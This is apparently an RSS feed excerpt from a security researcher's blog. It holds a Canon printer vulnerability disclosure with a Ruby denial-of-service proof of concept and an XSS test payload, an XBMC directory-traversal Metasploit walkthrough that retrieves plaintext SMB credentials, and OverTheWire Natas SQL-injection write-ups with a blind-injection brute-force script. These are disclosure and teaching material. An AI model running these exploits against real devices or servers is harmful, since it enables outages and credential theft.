+&lt;p&gt;I then figured I&amp;rsquo;d look at some of the more advanced settings, so I clicked the &amp;ldquo;Advanced&amp;rdquo; link. This brought me to a control panel for the printer. I saw a bunch of information, and was surprised that I had not entered &lt;b&gt;any&lt;/b&gt; credentials. I figured maybe the status page would be anonymous, but surely I&amp;rsquo;d need some password to access the management pages. But then again, I hadn&amp;rsquo;t used any password when setting up the printer using the LCD.&lt;/p&gt;
+
+&lt;h2 id=&#34;disclosure-of-wireless-key-and-ssid&#34;&gt;Disclosure of Wireless Key and SSID&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4614&#34;&gt;CVE-2013-4614&lt;/h3&gt;
+
+&lt;p&gt;I eventually browsed to the &amp;ldquo;Network Settings&amp;rdquo; tab, and saw my SSID of &amp;ldquo;Wireless&amp;rdquo;. Not too bad, since it&amp;rsquo;s broadcast in the air.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I saw that it was using WPA2, as I configured. I clicked the &amp;ldquo;Modify&amp;rdquo; button, and saw that I could change all of the wireless settings. The worst was that when I saw the &amp;ldquo;Use WPA2&amp;rdquo; radio button, I saw that there was text in the password box.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Assuming that there was a junk value in there, I viewed the source. Unfortunately, what I found was that the page did indeed have my printer&amp;rsquo;s WPA2 password right there.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_4.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I started thinking about this. It wasn&amp;rsquo;t a &lt;i&gt;huge&lt;/i&gt; issue, since you&amp;rsquo;d have to already know my WPA2 key to get to the printer, right? Oh, but what about if a device behind my firewall had been compromised by a remote attacker? The attacker would be free to navigate to my printer, and grab my password. If I was like just about every other person I talk to, I probably use the same password on everything, so I don&amp;rsquo;t have to remember unique passwords. That means now an attacker could potentially login to my email, my SSH server, or even other machines on my LAN. This scared me slightly.&lt;/p&gt;
+
+&lt;p&gt;After a while, I started thinking that perhaps there were people that could potentially put their printers directly connected to the internet, and have these management interfaces publicly exposed to anonymous clients. I checked out the &lt;a href=&#34;http://www.shodanhq.com/search?q=port%3A80+KS_HTTP+1.0&#34;&gt;ShodanHQ&lt;/a&gt; (FYI, it seems also Minolta uses this server banner as well). I saw that there were nearly 15,000 at the time of this writing, so I wrote up a quick Metasploit module to enumerate the information. It is located &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/canon_wireless.rb&#34;&gt;here&lt;/a&gt;. Below is sample output from a selection of hosts I got from ShodanHQ and a host that should time out, as a control sample.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_5.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;denial-of-service&#34;&gt;Denial of Service&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4615&#34;&gt;CVE-2013-4615&lt;/h3&gt;
+
+&lt;p&gt;I kept playing around with the configuration interface, and while tinkering with some inputs in &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp&lt;/a&gt;, the device stopped responding. I walked to the other room, where we keep the printer, and noticed that it was completely unresponsive. I had to power-cycle the device, to which it came back up and told me it wasn&amp;rsquo;t powered down properly.&lt;/p&gt;
+
+&lt;p&gt;When I reported this to Canon, they asked me for more information, so I provided them the following code as a proof-of-concept.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/ruby
+
+require &#39;net/http&#39;
+require &#39;uri&#39;
+
+print &#39;Enter your printer IP Address: &#39;
+input = gets.strip
+
+printer_url = &amp;quot;http://#{input}&amp;quot;
+
+# Make the first request, to set the IP to invalid data
+post = Net::HTTP.post_form(URI.parse(printer_url + &#39;/English/pages_MacUS/cgi_lan.cgi&#39;),
+{&#39;OK.x&#39; =&amp;gt; &#39;61&#39;, &#39;OK.y&#39; =&amp;gt; &#39;12&#39;, &#39;LAN_OPT1&#39; =&amp;gt; &#39;2&#39;, &#39;LAN_TXT1&#39; =&amp;gt; &#39;Wireless&#39;, &#39;LAN_OPT3&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT21&#39; =&amp;gt; &#39;192&#39;, 
+&#39;LAN_TXT22&#39; =&amp;gt; &#39;168&#39;, &#39;LAN_TXT23&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT24&#39; =&amp;gt; &#39;114&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(\&#39;xss\&#39;);&amp;lt;/script&amp;gt;&#39;, &#39;LAN_TXT31&#39; =&amp;gt; &#39;255&#39;,
+&#39;LAN_TXT32&#39; =&amp;gt; &#39;255&#39;, &#39;LAN_TXT33&#39; =&amp;gt; &#39;255&#39;, &#39;LAN_TXT34&#39; =&amp;gt; &#39;0&#39;, &#39;LAN_TXT41&#39; =&amp;gt; &#39;192&#39;, &#39;LAN_TXT42&#39; =&amp;gt; &#39;168&#39;, 
+&#39;LAN_TXT43&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT44&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_OPT2&#39; =&amp;gt; &#39;4&#39;, &#39;LAN_OPT4&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_HID1&#39; =&amp;gt; &#39;1&#39;})
+
+# Make the second request, to trigger the DoS
+begin
+get = Net::HTTP.get(URI.parse(printer_url + &#39;/English/pages_MacUS/lan_set_content.html&#39;))
+rescue Timeout::Error
+puts &#39;Look at your printer to see it is unresponsive.&#39;
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you look closely, you can see that I was testing for Cross-Site-Scripting, and put HTML in the &amp;ldquo;LAN_TXT24&amp;rdquo; input box. Canon&amp;rsquo;s javascript validation prevents this, but nothing stops you from manipulating the HTTP response. This is a prime example of why server-side validation is also required.&lt;/p&gt;
+
+&lt;p&gt;I ended up turning this into a Metasploit module as well. You can find it available &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/canon_wireless_printer.rb&#34;&gt;here&lt;/a&gt;. It works pretty similarly to most DoS modules:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_6.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;canon-s-response&#34;&gt;Canon&amp;rsquo;s Response&lt;/h2&gt;
+
+&lt;p&gt;I responsibly disclosed these vulnerabilities to Canon, but they apparently don&amp;rsquo;t deem them worthy of being fixed. I don&amp;rsquo;t think they really &amp;ldquo;get it&amp;rdquo;. Since they aren&amp;rsquo;t going to fix it, I am releasing these details publicly. Below is their reply:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Dear Mr. Andreko,&lt;/p&gt;
+
+&lt;p&gt;Thank you for your patience in allowing Canon to respond.  We have confirmed that the two issues you described in your May 27th e-mail can occur in certain printers such as the MX922.  However, with respect to the issue of no password by default, please note that the inkjet printers which have network functionality such as the MX922 are designed for home use which is supposed to be secured.  For this reason, and for user convenience, the default setting does not require a password.  However, if a user has a particular concern about third parties accessing the user’s home printer, the default setting can be changed to add a password.&lt;/p&gt;
+
+&lt;p&gt;Similarly, regarding the DoS issue, Canon believes that its printers will not have to deal with unauthorized access to the network from an external location as long as the printers are used in a secured environment.  The issue you described could only occur when unauthorized access to an unsecured network takes place from the outside.  Canon has long advised customers to ensure that their computers and printers are secured when used in a wireless LAN environment.  We will continue advising customers to use our inkjet printers in a secured network environment with a firewall.  However, even if the printer were not used in a secure environment, in the unlikely chance that this type of access occurred from outside, the printer would simply have to be unplugged and re-plugged to ensure normal operation.  In addition, if the network security settings on the printer had been changed by the external source as a result of the incident, then they would have to be changed back to the default settings along with unplugging and re-plugging the power cord to ensure normal operation.&lt;/p&gt;
+
+&lt;p&gt;Again, we thank you for giving Canon the opportunity to investigate these issues and to respond to your concerns.&lt;/p&gt;
+
+&lt;p&gt;Best regards,
+Joy
+Executive Response Representative
+Canon Customer Relations
+customer@cits.canon.com
+866-886-1901, x 2130&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I understand, these vulnerabilites aren&amp;rsquo;t super high priority. They&amp;rsquo;re no ms08-067. But I would still think a vendor would want to fix them. When searching ShodanHQ, I found a bunch of printers from UCLA. I can only imagine the chaos when it becomes finals-week, and all the printers on campus stop working randomly. That&amp;rsquo;d be bad PR for Canon. Who knows what else is out there. I&amp;rsquo;d personally be interested in dumping the firmware of the printer, and seeing if there&amp;rsquo;s a way to get remote code execution out of a crash. I&amp;rsquo;ll chalk that up to my TODO list.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>XBMC Traversal Metasploit Module</title>
+      <link>https://www.mattandreko.com/blog/2013-02-25-xbmc-traversal-metasploit-module/</link>
+      <pubDate>Mon, 25 Feb 2013 15:32:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-02-25-xbmc-traversal-metasploit-module/</guid>
+      <description>
+
+&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
+
+&lt;p&gt;I was talking in &lt;a href=&#34;irc://chat.freenode.net:6667/intern0t&#34;&gt;Intern0t&lt;/a&gt; several months ago. &lt;a href=&#34;https://twitter.com/Acidgen&#34;&gt;AcidGen&lt;/a&gt;, from &lt;a href=&#34;http://www.ioactive.com&#34;&gt;IOActive&lt;/a&gt; mentioned that he found a bug in &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt;. I use &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt; quite a bit at home, on various platforms, since it&amp;rsquo;s extremely wife-friendly. I hit him up, and we started talking. We had a nice Skype conversation, where we discussed possible platforms that were affected, and future exploits that we&amp;rsquo;d like to find. Since I had a jailbroken &lt;a href=&#34;https://www.apple.com/appletv&#34;&gt;Apple TV 2&lt;/a&gt; and &lt;a href=&#34;http://www.raspberrypi.org&#34;&gt;RaspberryPi&lt;/a&gt;, I told him that I could test those platforms and help out.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;An &lt;a href=&#34;http://www.ioactive.com/pdfs/Security_Advisory_XBMC.pdf&#34;&gt;official disclosure&lt;/a&gt; was released, detailing the directory traversal vulnerability. The &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt; team was able to make a &lt;a href=&#34;https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335&#34;&gt;fix&lt;/a&gt;, and the new version 12 is not vulnerable.&lt;/p&gt;
+
+&lt;h2 id=&#34;why-does-this-vulnerability-matter&#34;&gt;Why does this vulnerability matter?&lt;/h2&gt;
+
+&lt;p&gt;When talking with the &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt;, they seemed to play off the vulnerability, because they believed nobody would ever expose this service to a public network. However, a quick &lt;a href=&#34;http://www.shodanhq.com/search?q=xbmc&#34;&gt;ShodanHQ&lt;/a&gt; search shows that people are exposing it. But you may say, &amp;ldquo;Matt, this is only a directory traversal vulnerability, what are you going to do, steal someone&amp;rsquo;s MP3s?&amp;rdquo;. The issue here, lies in that if you can read any file on the system, that may include password files, such as /etc/passwd or even /etc/shadow if the service runs as root. What makes this even worse, is that due to how XBMC has to pass credentials to a fileserver, it stores the credentials in plain text. This gives an attacker a &lt;i&gt;huge&lt;/i&gt; advantage. They now have valid credentials on at least one system. If the system has SMB exposed as well, it could easily be game-over.&lt;/p&gt;
+
+&lt;h2 id=&#34;let-s-see-the-exploit&#34;&gt;Let&amp;rsquo;s see the exploit&amp;hellip;&lt;/h2&gt;
+
+&lt;p&gt;I don&amp;rsquo;t know why it took so long, but I finally finished the MSF module for this vulnerability. It can be found &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/xbmc_traversal.rb&#34;&gt;here&lt;/a&gt;. The usage is pretty simple. Here is a sample exploitation against an &lt;a href=&#34;https://www.apple.com/appletv&#34;&gt;Apple TV 2&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;As usual, watch the pretty ASCII-art go by, and use the module.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;420-1572-man:gather mandreko$ msfconsole
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
++ -- --=[ 1048 exploits - 590 auxiliary - 174 post
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+msf &amp;gt; use auxiliary/gather/xbmc_traversal
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&amp;lt;/pre&amp;gt;Check out the options. You&#39;ll see the username and password that need to be set (however it&#39;s often defaulted to &amp;quot;xbmc&amp;quot;, as well as the host, and file to disclose. 
+&amp;lt;pre&amp;gt;msf  auxiliary(xbmc_traversal) &amp;gt; show options
+
+Module options (auxiliary/gather/xbmc_traversal):
+
+   Name      Current Setting                                                      Required  Description
+   ----      ---------------                                                      --------  -----------
+   DEPTH     9                                                                    yes       The max traversal depth
+   FILEPATH  /private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml  no        The name of the file to download
+   PASSWORD  xbmc                                                                 yes       The password to use for the HTTP server
+   Proxies                                                                        no        Use a proxy chain
+   RHOST                                                                          yes       The target address
+   RPORT     8080                                                                 yes       The target port
+   USERNAME  xbmc                                                                 yes       The username to use for the HTTP server
+   VHOST                                                                          no        HTTP server virtual host
+
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Go ahead and set the RHOST to the XBMC server.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; set rhost 192.168.1.102
+rhost =&amp;gt; 192.168.1.102
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lastly, run the exploit&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; run
+
+[+] File saved in: /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
+[*] Auxiliary module execution completed
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can see this was successful. It saved the file locally, and added notes in &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt;. Just to verify the findings, you can read the file it saved.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] exec: cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
+
+&amp;lt;passwords&amp;gt;
+    &amp;lt;path&amp;gt;
+        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/Movies&amp;lt;/from&amp;gt;
+        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/Movies/&amp;lt;/to&amp;gt;
+    &amp;lt;/path&amp;gt;
+    &amp;lt;path&amp;gt;
+        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/tv&amp;lt;/from&amp;gt;
+        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/tv/&amp;lt;/to&amp;gt;
+    &amp;lt;/path&amp;gt;
+    &amp;lt;path&amp;gt;
+        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/Music&amp;lt;/from&amp;gt;
+        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/Music/&amp;lt;/to&amp;gt;
+    &amp;lt;/path&amp;gt;
+&amp;lt;/passwords&amp;gt;
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And there you have it. You now have valid credentials on that fileserver. You could start escalating with psexec or other methods. Half the battle is already over.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 15</title>
+      <link>https://www.mattandreko.com/blog/2012-11-14-overthewire-natas-level-15/</link>
+      <pubDate>Wed, 14 Nov 2012 06:29:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-14-overthewire-natas-level-15/</guid>
+      <description>&lt;p&gt;Up until now, none of the OverTheWire Natas challenges really gave me that much of an issue. This one however, took me a couple hours to complete. Level 15 is a fun blind sql-injection vulnerability.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts out with a username check dialog, which pretty much only gives you a binary value as to if a username exists or not.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas15_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I looked at the source code, and couldn&amp;rsquo;t see any way to inject some SQL to get it to retrieve the password for me.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
+&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
+&amp;lt;body&amp;gt; 
+&amp;lt;h1&amp;gt;natas15&amp;lt;/h1&amp;gt; 
+&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
+&amp;lt;? 
+
+/* 
+CREATE TABLE `users` ( 
+  `username` varchar(64) DEFAULT NULL, 
+  `password` varchar(64) DEFAULT NULL 
+); 
+*/ 
+
+if(array_key_exists(&amp;quot;username&amp;quot;, $_REQUEST)) { 
+    $link = mysql_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); 
+    mysql_select_db(&#39;natas15&#39;, $link); 
+     
+    $query = &amp;quot;SELECT * from users where username=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;username&amp;quot;].&amp;quot;\&amp;quot;&amp;quot;; 
+    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) { 
+        echo &amp;quot;Executing query: $query&amp;lt;br&amp;gt;&amp;quot;; 
+    } 
+
+    $res = mysql_query($query, $link); 
+    if($res) { 
+    if(mysql_num_rows($res) &amp;gt; 0) { 
+        echo &amp;quot;This user exists.&amp;lt;br&amp;gt;&amp;quot;; 
+    } else { 
+        echo &amp;quot;This user doesn&#39;t exist.&amp;lt;br&amp;gt;&amp;quot;; 
+    } 
+    } else { 
+        echo &amp;quot;Error in query.&amp;lt;br&amp;gt;&amp;quot;; 
+    } 
+
+    mysql_close($link); 
+} else { 
+?&amp;gt; 
+
+&amp;lt;form action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
+Username: &amp;lt;input name=&amp;quot;username&amp;quot;&amp;gt;&amp;lt;br&amp;gt; 
+&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Check existence&amp;quot; /&amp;gt; 
+&amp;lt;/form&amp;gt; 
+&amp;lt;? } ?&amp;gt; 
+&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
+&amp;lt;/div&amp;gt; 
+&amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I did notice though, that it would verify that a row was returned, so I could inject SQL to brute-force the password. Assuming that the password was 32 digits long (like the previous ones), this could take some time however, since the character set was uppercase, lowercase, and digits. That&amp;rsquo;s up to 62 attempts per digit of the password. I started doing this manually to verify that this was a possibility. With the &amp;ldquo;debug&amp;rdquo; flag on, you can see the query, and that the first digit of the password is not &amp;ldquo;b&amp;rdquo;.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas15_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I cycled through manually all the lowercase and upper case letters. Once I got partially through the numbers, I got a successful hit! This means that the password starts with a &amp;ldquo;3&amp;rdquo;.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas15_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The next step for me, was to automate this process. I decided to write some ruby to accomplish it. This code seems to do the job:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;require &#39;uri&#39;
+require &#39;net/http&#39;
+
+url = URI.parse(&amp;quot;http://natas15.natas.labs.overthewire.org/index.php&amp;quot;)
+http = Net::HTTP.new(url.host, url.port)
+chars = (&#39;a&#39;..&#39;z&#39;).to_a + (&#39;A&#39;..&#39;Z&#39;).to_a + (&#39;0&#39;..&#39;9&#39;).to_a
+password = &amp;quot;&amp;quot;
+found = false
+
+# 64 was selected, since the password field is a varchar(64)
+# Most likely, since all other passwords were 32 digits long, it&#39;ll be that
+(1..64).each do |i|
+ chars.each do |c| 
+  found = false
+  request = Net::HTTP::Post.new(url.request_uri)
+  request.basic_auth(&amp;quot;natas15&amp;quot;, &amp;quot;m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV&amp;quot;)
+  query = &#39;natas16&amp;quot; AND SUBSTRING(password, &#39; + i.to_s + &#39;, 1) LIKE BINARY &amp;quot;&#39; + c
+  request.set_form_data({&amp;quot;username&amp;quot; =&amp;gt; query})
+  response = http.request(request)
+
+  if response.body.include?(&amp;quot;This user exists&amp;quot;)
+   password += c
+   found = true
+   puts &amp;quot;Current pass: #{password}&amp;quot;
+   break
+  end
+ end
+ # If no letter/number was found, it&#39;s fairly safe to assume it&#39;s done
+ break if !found
+end
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The output shows:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ ruby natas15.rb
+Current pass: 3
+Current pass: 3V
+Current pass: 3Vf
+Current pass: 3VfC
+Current pass: 3VfCz
+Current pass: 3VfCzg
+Current pass: 3VfCzga
+Current pass: 3VfCzgaW
+Current pass: 3VfCzgaWj
+Current pass: 3VfCzgaWjE
+Current pass: 3VfCzgaWjEA
+Current pass: 3VfCzgaWjEAc
+Current pass: 3VfCzgaWjEAcm
+Current pass: 3VfCzgaWjEAcmC
+Current pass: 3VfCzgaWjEAcmCQ
+Current pass: 3VfCzgaWjEAcmCQp
+Current pass: 3VfCzgaWjEAcmCQph
+Current pass: 3VfCzgaWjEAcmCQphi
+Current pass: 3VfCzgaWjEAcmCQphiE
+Current pass: 3VfCzgaWjEAcmCQphiEP
+Current pass: 3VfCzgaWjEAcmCQphiEPo
+Current pass: 3VfCzgaWjEAcmCQphiEPoX
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9H
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Ht
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htl
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htlm
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmV
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And there you go, the password for level 16 shows up as the last line before it quits.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 14</title>
+      <link>https://www.mattandreko.com/blog/2012-11-13-overthewire-natas-level-14/</link>
+      <pubDate>Tue, 13 Nov 2012 05:08:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-13-overthewire-natas-level-14/</guid>
+      <description>&lt;p&gt;The next level of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame is &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas14.shtml&#34;&gt;Level 14&lt;/a&gt;, which introduces &lt;a href=&#34;https://www.owasp.org/index.php/SQL_Injection&#34;&gt;SQL Injection&lt;/a&gt;, a very popular subject as of late.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The level starts out with a login dialog.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas14_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The source code is fairly straight forward. It&amp;rsquo;s doing a basic authentication query. It however, does have a handy &amp;ldquo;debug&amp;rdquo; flag, that if set, will print the query used to the screen.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
+&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
+&amp;lt;body&amp;gt; 
+&amp;lt;h1&amp;gt;natas14&amp;lt;/h1&amp;gt; 
+&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
+&amp;lt;? 
+if(array_key_exists(&amp;quot;username&amp;quot;, $_REQUEST)) { 
+    $link = mysql_connect(&#39;localhost&#39;, &#39;natas14&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); 
+    mysql_select_db(&#39;natas14&#39;, $link); 
+     
+    $query = &amp;quot;SELECT * from users where username=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;username&amp;quot;].&amp;quot;\&amp;quot; and password=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;password&amp;quot;].&amp;quot;\&amp;quot;&amp;quot;;
+    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) { 
+        echo &amp;quot;Executing query: $query&amp;lt;br&amp;gt;&amp;quot;; 
+    } 
+
+    if(mysql_num_rows(mysql_query($query, $link)) &amp;gt; 0) { 
+            echo &amp;quot;Successful login! The password for natas15 is &amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&amp;quot;; 
+    } else { 
+            echo &amp;quot;Access denied!&amp;lt;br&amp;gt;&amp;quot;; 
+    } 
+    mysql_close($link); 
+} else { 
+?&amp;gt; 
+
+&amp;lt;form action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
+Username: &amp;lt;input name=&amp;quot;username&amp;quot;&amp;gt;&amp;lt;br&amp;gt; 
+Password: &amp;lt;input name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;br&amp;gt; 
+&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Login&amp;quot; /&amp;gt; 
+&amp;lt;/form&amp;gt; 
+&amp;lt;? } ?&amp;gt; 
+&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
+&amp;lt;/div&amp;gt; 
+&amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I simply appended the URL with the parameters I wanted. I set the &amp;ldquo;debug&amp;rdquo; flag to a true value, and put in a junk username and password.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas14_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Since that showed me what query was being ran, I modified it to inject some code (&amp;rdquo; or 1=1 &amp;ndash; ) to return all rows in the table, guaranteeing that at least one entry would show up. This ends up changing the SQL query to do a comparison based on username, OR where 1=1, which is always true. After that, the &amp;ldquo;&amp;ndash; &amp;rdquo; simply comments out the rest of the query, so that no issues arise from stuff later on. Make sure to have a space after the dashes, else it may not work. Once everything was completed, it showed me the password to the next level.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas14_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 13</title>
